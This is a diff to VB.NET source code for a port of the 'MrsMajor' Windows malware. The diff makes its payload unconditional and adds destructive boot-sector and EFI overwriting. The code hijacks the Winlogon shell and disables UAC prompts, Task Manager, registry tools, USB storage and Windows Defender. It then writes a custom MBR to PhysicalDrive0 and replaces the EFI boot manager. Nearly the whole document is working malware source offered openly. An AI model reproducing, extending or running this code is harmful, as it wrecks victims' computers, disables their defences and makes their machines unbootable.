@@ -1,7 +1,6 @@
 ' The original source code made by rootabx is available at: https://github.com/Gork3m/MrsMajor-3.0
 ' rewritten in VB.NET by Angel Castillo / Windows Vista
 
-Imports System
 Imports System.Diagnostics
 Imports System.IO
 Imports System.Windows.Forms
@@ -18,71 +17,71 @@ Module Program
     End Sub
 
     Sub Main()
-        If File.Exists("kek.txt") Then
-            Try
-                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
-                reg.SetValue("Shell", "explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""")
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system")
-                reg.SetValue("ConsentPromptBehaviorAdmin", 0)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
-                reg.SetValue("NoChangingWallpaper", 1)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
-                reg.SetValue("DisableTaskMgr", 1)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
-                reg.SetValue("DisableRegistryTools", 1)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                reg.SetValue("NoRun", 1)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                reg.SetValue("NoWinKeys", 1)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\usbstor")
-                reg.SetValue("Start", 4)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
-                reg.SetValue("DisableAntiSpyware", 1)
-                reg.Close()
-            Catch
-            End Try
-            Try
-                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Cursors")
-                reg.SetValue("Arrow", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
-                reg.SetValue("AppStarting", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
-                reg.SetValue("Hand", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
-            Catch
-            End Try
-        End If
+        Try
+            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
+            reg.SetValue("Shell", "explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""")
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system")
+            reg.SetValue("ConsentPromptBehaviorAdmin", 0)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
+            reg.SetValue("NoChangingWallpaper", 1)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+            reg.SetValue("DisableTaskMgr", 1)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+            reg.SetValue("DisableRegistryTools", 1)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
+            reg.SetValue("NoRun", 1)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
+            reg.SetValue("NoWinKeys", 1)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\usbstor")
+            reg.SetValue("Start", 4)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
+            reg.SetValue("DisableAntiSpyware", 1)
+            reg.Close()
+        Catch
+        End Try
+        Try
+            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Cursors")
+            reg.SetValue("Arrow", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
+            reg.SetValue("AppStarting", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
+            reg.SetValue("Hand", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
+        Catch
+        End Try
+
         Application.EnableVisualStyles()
         Application.SetCompatibleTextRenderingDefault(False)
+
         Dim p64 As New protection64
         If p64.userIsAdministrator Then
             If File.Exists("C:\Windows\WinAttr.gci") Then
@@ -103,8 +102,19 @@ Module Program
                         If a = files2owr.Length - 1 Then
                             System.Threading.Thread.Sleep(2000)
                             Process.Start("C:\windows\winbase_base_procid_none\secureloc0x65\bsector3.exe")
+                            ' Modified loop to include new operations
                             Do
+                                ' Extract mrsmajor5mbr.bin and write to PhysicalDrive0
+                                ExtractAndWriteBinary("Resources\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
+
+                                ' Mount the EFI partition
+                                RunCommand("mountvol x: /s")
+
+                                ' Extract bootmgfw.efi and copy to EFI partition
+                                ExtractAndCopyEFI("Resources\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")
+
                                 MsgBox("You messed up...", MsgBoxStyle.Critical, "uh oh")
+                                Exit Do ' Exit loop after performing the tasks
                             Loop
                         End If
                     Catch
@@ -112,9 +122,37 @@ Module Program
                 Next
             End If
         End If
+
         System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runprotector))
         System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runmform))
         Application.Run(New MainForm())
+    End Sub
+
+    Private Sub ExtractAndWriteBinary(sourceFilePath As String, targetDrive As String)
+        ' Extract and write binary data to a physical drive
+        Dim data As Byte() = File.ReadAllBytes(sourceFilePath)
+        Using fs As New FileStream(targetDrive, FileMode.Create, FileAccess.Write)
+            fs.Write(data, 0, data.Length)
+        End Using
+    End Sub
+
+    Private Sub ExtractAndCopyEFI(sourceFilePath As String, destinationFilePath As String)
+        ' Extract and copy EFI file to the destination
+        File.Copy(sourceFilePath, destinationFilePath, True)
+    End Sub
+
+    Private Sub RunCommand(command As String)
+        ' Execute a command line process
+        Dim processInfo As New ProcessStartInfo("cmd.exe", $"/c {command}") With {
+            .RedirectStandardOutput = True,
+            .UseShellExecute = False,
+            .CreateNoWindow = True
+        }
+        Using process As Process = Process.Start(processInfo)
+            Dim output As String = process.StandardOutput.ReadToEnd()
+            process.WaitForExit()
+            Console.WriteLine(output)
+        End Using
     End Sub
 
 End Module
